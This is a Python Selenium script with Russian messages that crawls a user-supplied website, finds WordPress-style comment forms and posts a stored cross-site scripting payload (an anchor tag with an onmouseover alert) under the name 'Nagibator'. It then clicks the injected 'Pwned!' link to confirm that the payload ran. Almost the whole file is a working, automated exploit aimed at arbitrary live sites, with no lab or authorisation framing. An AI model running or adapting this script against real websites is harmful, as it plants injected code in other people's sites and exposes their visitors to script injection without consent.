from selenium import webdriver
from selenium.common.exceptions import NoSuchElementException
from urllib.request import urlopen
from urllib.error import HTTPError
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException
success = False

def Type_Expl():
    Typed = False
    try:
        elem = driver.find_element_by_link_text("Pwned!")
        elem.click()
        WebDriverWait(driver, 3).until(EC.alert_is_present())
        alert = driver.switch_to_alert()
        print("XSS удался!")
        return(True)
    except (TimeoutException, NoSuchElementException):
        try:
            author = driver.find_element_by_name("author")
            author.send_keys("Nagibator")
            email = driver.find_element_by_name("email")
            email.send_keys("Nagibator@gmail.com")
            commentbox = driver.find_element_by_id("comment")
            commentbox.send_keys("[a <a href=']'></a><a href=' onmouseover=alert(1) '>Pwned!</a>")
            commentbox.submit()
            Typed = True
            elem = driver.find_element_by_link_text("Pwned!")
            elem.click()
            WebDriverWait(driver, 3).until(EC.alert_is_present())
            alert = driver.switch_to_alert()
            print("XSS удался!")
            return(True)
        except (NoSuchElementException, TimeoutException):
            if Typed == True:
                print("Эксплоит был применён, но, из-за модерации комментариев, нельзя проверить удачно, или нет")
            return(False)

url = input("Введите адрес сайта\n")
print("Подождите")
driver = webdriver.Firefox()
driver.get(url)
list_links = driver.find_elements_by_tag_name("a")
list = []
for item in list_links:
    if (item.get_attribute('href') not in list and item.get_attribute('href') != "http://wordpress.org/" and item.get_attribute('href') != "http://ru.wordpress.org/"):
        list.append(item.get_attribute('href'))
    
for p in list:
    driver.get(p)
    success = Type_Expl()
    if success == True:
        break
    try:
        link = driver.find_element_by_partial_link_text("omment")
        link.click()
        success = Type_Expl()
        if success == True:
            break
    except NoSuchElementException:
        try:
            link = driver.find_element_by_partial_link_text("оммента")
            link.click()
            success = Type_Expl()
            if success == True:
                break
        except NoSuchElementException:
            continue
if(success == False):
    print("Инъекция не удалась") 
driver.quit()   
    
#assert "Python" in driver.title
#element = driver.find_element_by_id("comment")
#element.send_keys("[a <a href=']'></a><a href=' onmouseover=alert(1) '>Pwned!</a>")
#element.submit()
#driver.quit()
